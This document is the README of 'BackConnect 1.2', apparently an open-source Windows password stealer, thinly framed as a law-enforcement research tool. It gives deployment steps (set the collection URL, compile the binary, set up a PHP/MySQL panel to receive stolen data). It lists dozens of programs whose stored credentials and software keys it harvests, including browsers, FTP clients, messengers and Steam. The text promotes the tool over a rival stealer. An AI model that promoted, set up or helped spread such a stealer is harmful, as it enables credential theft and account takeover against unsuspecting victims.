
BackConnect 1.2 - Steal the evidence.

BackConnect is a password and information stealer for law enforcements. It is a research project and helps you in understanding Windows security.
This program tries to steal the passwords also from the other users (Vista/7).

This is the most complete stealer, better than the iStealer !@#$. And its open source, no backdoors, no limitations.


==== Installation ====

1. Open solution file BackConnect.sln, select 'Release', modify the url in Config.h
2. Compile the project BackConnect
3. Set up a webhosting with PHP and MySQL, modify config.php
3.1 Upload the files to your web-server and run install.php and remove it
3.1 Download the current ip-to-country.csv from http://ip-to-country.webhosting.info/node/view/6 to the Interface directory
3.2 Extract the sqlite3.dll from http://www.sqlite.org/sqlitedll-3_7_3.zip (or whatever is the latest) to the Interface directory
4. Use Release\BackConnect.exe and http://[Your Website]/interface.php

In the web-interface click on a computer id to show the complete collected evidence (you can also generate an evidence report there).
If you use the builder start with step 3.


==== Notes ====

[1] The web-interface requires PHP 5.2. If you get syntax parsing error, remove the used goto in interface.php:

Delete Line 190:
-    Search:

Modify at Line 322
-//    		  header("Location: ?action=search");
-          goto Search; // fix me
to
+    		  header("Location: ?action=search");

[2] The SmartFTP passwords are crypted (encryption currently unknown). However, you can insert manually the encrypted password into the xml file (?).

[3] The CoreFTP passwords are crypted too (also unknown encryption). However, you can insert the passwords manually into the registry (?).

[4] Good Reading
http://www.mcafee.com/us/local_content/reports/6622rpt_password_stealers_0709_en.pdf


==== Version History ====

[12.10.2010]  Initial Release (1.0), steals following passwords:
* MSN
* Google Talk
* Trillian
* Pidgin
* Paltalk
* Steam
* No-IP
* DynDNS
* FireFox (all versions)
* Internet Explorer (unreliable) 
* FileZilla
* FlashFXP
* Keys from various games, software
* Outlook (old versions)

[20.10.2010]  1.1 - Gather the evidence.
* IMVU
* Internet Download Manager
+ Added Export Evidence button in suspect detail page
+ Export tab
* Usability fixes in web-interface

[28.10.2010]  1.2 - Steal the evidence.
* Chrome (< 2010)
* RapidShare Downloader
* SmartFTP
* CoreFTP
* FTP Commander
* Stealing now 213 keys (+17 to previous version) of software and games
+ Builder now shipped by default


BackConnect was completely developed and published under United States law.
This program may not be used in the countries Germany, Austria and Czech Republic. It is not available
in those countries and the source and binaries may not be distributed there.

This is a research project. Do not abuse it. Use at your own risk. Local country laws may apply.
Published unter European Union Public Licence, contains other open sources.

(C) 2010 
